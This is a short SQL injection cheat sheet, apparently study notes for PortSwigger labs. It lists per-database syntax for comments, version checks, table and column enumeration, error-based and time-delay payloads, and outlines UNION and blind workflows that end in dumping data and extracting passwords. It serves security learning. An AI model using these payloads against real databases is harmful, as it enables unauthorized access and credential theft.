# SQL Injection Cheat Sheet (by database)

Quick reference used while solving the labs. Source concepts: PortSwigger SQL injection cheat sheet.

| Task | Oracle | Microsoft | PostgreSQL | MySQL |
|------|--------|-----------|------------|-------|
| Comment | `--comment` | `--comment` / `/*c*/` | `--comment` / `/*c*/` | `-- comment` (space) / `#comment` |
| Version | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
| Concatenation | `'a'||'b'` | `'a'+'b'` | `'a'||'b'` | `CONCAT('a','b')` |
| Substring | `SUBSTR('abc',1,1)` | `SUBSTRING('abc',1,1)` | `SUBSTRING('abc',1,1)` | `SUBSTRING('abc',1,1)` |
| List tables | `SELECT table_name FROM all_tables` | `SELECT table_name FROM information_schema.tables` | same as MSSQL | same as MSSQL |
| List columns | `SELECT column_name FROM all_tab_columns WHERE table_name='X'` | `... information_schema.columns WHERE table_name='x'` | same | same |
| Conditional error | `SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` | `SELECT CASE WHEN (cond) THEN 1/0 ELSE NULL END` | `1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE NULL END)` | `SELECT IF(cond,(SELECT table_name FROM information_schema.tables),'a')` |
| Time delay | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `SELECT pg_sleep(10)` | `SELECT SLEEP(10)` |

## UNION workflow
1. Find column count: `' ORDER BY n--` or `' UNION SELECT NULL,...--`
2. Find string columns: `' UNION SELECT 'a',NULL,...--`
3. Fingerprint DB, enumerate tables and columns, dump data.

## Blind workflow
1. Confirm a differentiator (content, error, delay).
2. Find length: `LENGTH(password)>n`.
3. Extract each character with Intruder.
